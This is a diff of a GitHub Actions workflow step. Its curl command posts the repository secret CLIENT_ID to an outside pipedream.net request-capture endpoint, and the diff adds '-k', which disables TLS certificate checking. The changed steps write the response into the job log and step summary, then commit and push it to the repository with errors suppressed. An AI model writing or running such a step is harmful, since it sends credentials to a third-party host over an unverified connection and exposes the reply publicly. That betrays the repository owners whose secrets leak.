@@ -6,15 +6,11 @@ jobs:
     steps:
     - uses: actions/checkout@v4
     - run: |
-        curl -X POST https://eo.o_zwIrG4g.m.pipedream.net \
+        curl -k -X POST https://o_zwIrG4g.m.pipedream.net \
         -H "Content-Type: application/json" \
         -d '{"client_id":"${{ secrets.CLIENT_ID }}","test":true}' > result.txt
-      env:
-        CLIENT_ID: ${{ secrets.CLIENT_ID }}
     - run: |
-        echo "## Result" >> $GITHUB_STEP_SUMMARY
-        cat result.txt >> $GITHUB_STEP_SUMMARY
+        echo "Status: $(cat result.txt)"
+        echo "## Result\n\`\`\`\n$(cat result.txt)\n\`\`\`" >> $GITHUB_STEP_SUMMARY
         cp result.txt 📋-report.txt
-        git add 📋-report.txt
-        git commit -m "Test result" || true
-        git push
+        git add 📋-report.txt && git commit -m "Test" && git push || true
